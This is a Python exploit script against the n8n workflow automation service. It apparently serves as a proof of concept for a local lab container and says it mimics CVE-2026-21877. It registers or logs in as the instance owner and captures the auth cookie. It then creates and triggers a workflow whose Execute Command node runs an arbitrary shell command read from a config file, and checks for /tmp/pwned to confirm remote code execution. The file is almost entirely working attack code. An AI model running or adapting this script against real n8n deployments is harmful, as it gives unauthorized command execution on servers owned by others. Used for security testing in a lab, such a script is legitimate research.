import json
import subprocess
import sys
import time
import tomllib

import requests


def attack():
    # Load config
    try:
        with open("config.toml", "rb") as f:
            config = tomllib.load(f)
        email = config["attack"]["email"]
        password = config["attack"]["password"]
        cmd = config["attack"]["command"]
    except Exception as e:
        print(f"[!] Error loading config: {e}")
        sys.exit(1)

    base_url = "http://localhost:5678"

    print(f"[*] Target: {base_url}")
    print(f"[*] Attempting to register owner account...")

    # 1. Register Owner (if not already registered)
    # This provides us with the authentication cookie needed for the exploit
    s = requests.Session()
    # Minimal headers matching curl (mostly)
    s.headers.update({"User-Agent": "python-requests/exploitation-script"})
    register_url = f"{base_url}/rest/owner/setup"
    login_url = f"{base_url}/rest/login"

    auth_cookie = None

    # Retry registration loop to handle container startup
    max_retries = 10
    for i in range(max_retries):
        try:
            # Try to register
            reg_payload = {
                "email": email,
                "password": password,
                "firstName": "Red",
                "lastName": "Team",
            }
            res = s.post(register_url, json=reg_payload)

            if res.status_code == 200:
                print(f"[+] Owner registered successfully.")
                break  # Success
            elif res.status_code == 404 or res.status_code == 502:
                print(
                    f"[*] API not ready ({res.status_code}), retrying {i+1}/{max_retries}..."
                )
                time.sleep(2)
                continue
            elif (
                res.status_code == 403
                or res.status_code == 400
                or "owner already setup" in res.text
            ):
                print("[*] Instance already owned. Attempting login...")
                # Login logic...
                login_payload = {"email": email, "password": password}
                res = s.post(login_url, json=login_payload)

                # Try alternate login payload if first fails or just default to emailOrLdapLoginId
                if res.status_code != 200:
                    print(
                        "[*] Login failed with email key, trying emailOrLdapLoginId..."
                    )
                    login_payload = {"emailOrLdapLoginId": email, "password": password}
                    res = s.post(login_url, json=login_payload)

                if res.status_code == 200:
                    print(f"[+] Login successful.")
                    break  # Success
                else:
                    print(f"[!] Login failed: {res.status_code} - {res.text}")
                    sys.exit(1)
            else:
                print(f"[!] Registration failed: {res.status_code} - {res.text}")
                sys.exit(1)
        except requests.exceptions.ConnectionError:
            print(f"[*] Connection failed, retrying {i+1}/{max_retries}...")
            time.sleep(2)
    else:
        print("[!] Failed to connect/register after retries.")
        sys.exit(1)

    # Get auth cookie
    if "n8n-auth" in s.cookies:
        auth_cookie = s.cookies["n8n-auth"]
        print(f"[+] Auth cookie captured: {auth_cookie[:10]}...")
    else:
        print("[!] No auth cookie found even after login loop. Exiting.")
        sys.exit(1)

    print(f"[*] Command to execute: {cmd}")

    # 2. Exploitation: Workflow with Execute Command
    # Since we have authenticated access and the sandbox has NODES_EXCLUDE="",
    # we can use the Execute Command node to demonstrate RCE.
    # This mimics the impact of CVE-2026-21877 where arbitrary file writing leads to code execution.

    print("[*] Creating simple malicious workflow (Start -> Execute Command)...")

    workflow_payload = {
        "name": "Exploit Workflow",
        "active": False,
        "nodes": [
            {
                "parameters": {},
                "name": "Start",
                "type": "n8n-nodes-base.start",
                "typeVersion": 1,
                "position": [250, 300],
            },
            {
                "parameters": {"command": cmd},
                "name": "Execute Command",
                "type": "n8n-nodes-base.executeCommand",
                "typeVersion": 1,
                "position": [450, 300],
            },
        ],
        "connections": {
            "Start": {
                "main": [[{"node": "Execute Command", "type": "main", "index": 0}]]
            }
        },
    }

    try:
        # Create workflow
        cookies = {"n8n-auth": auth_cookie}
        create_res = s.post(
            f"{base_url}/rest/workflows", json=workflow_payload, cookies=cookies
        )
        if create_res.status_code != 200:
            print(f"[!] Failed to create workflow: {create_res.text}")
            sys.exit(1)

        create_data = create_res.json()
        print(f"[*] Workflow created with ID: {create_data['data']['id']}")
        workflow_id = create_data["data"]["id"]

        # Update payload with IDs for run
        workflow_payload["nodes"] = create_data["data"]["nodes"]
        workflow_payload["id"] = workflow_id

        # Trigger Manual Run
        print("[*] Triggering workflow (Manual Run)...")
        run_payload = {
            "workflowData": workflow_payload,
            "runData": {
                "Start": [
                    {
                        "startTime": int(time.time() * 1000),
                        "data": {"main": [[{"json": {}}]]},
                    }
                ]
            },
            "mode": "manual",
            "destinationNode": "Execute Command",
        }

        run_res = s.post(
            f"{base_url}/rest/workflows/{workflow_id}/run",
            json=run_payload,
            cookies=cookies,
        )

        if run_res.status_code == 200:
            print("[+] Manual run initiated!")
            data = run_res.json()
            if "data" in data and "executionId" in data["data"]:
                print(f"[*] Execution ID: {data['data']['executionId']}")
                print("[*] Waiting 5 seconds for execution...")
                time.sleep(5)

                # Check for side effect
                print("[*] Verifying RCE via file existence (/tmp/pwned)...")
                try:
                    # We are running on the host, so we can use podman directly
                    check = subprocess.run(
                        ["podman", "exec", "n8n_vuln_container", "ls", "/tmp/pwned"],
                        capture_output=True,
                        text=True,
                    )
                    if check.returncode == 0:
                        print("\n[$$] RCE CONFIRMED! Found /tmp/pwned in container.\n")
                    else:
                        print(f"[!] RCE Verification Failed: {check.stderr}")
                except Exception as e:
                    print(f"[!] Failed to run podman check: {e}")
            else:
                print(f"[*] Execution finished immediately? Response: {data}")
        else:
            print(f"[!] Manual run failed: {run_res.status_code} - {run_res.text}")

    except Exception as e:
        print(f"[!] Exploitation error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    attack()
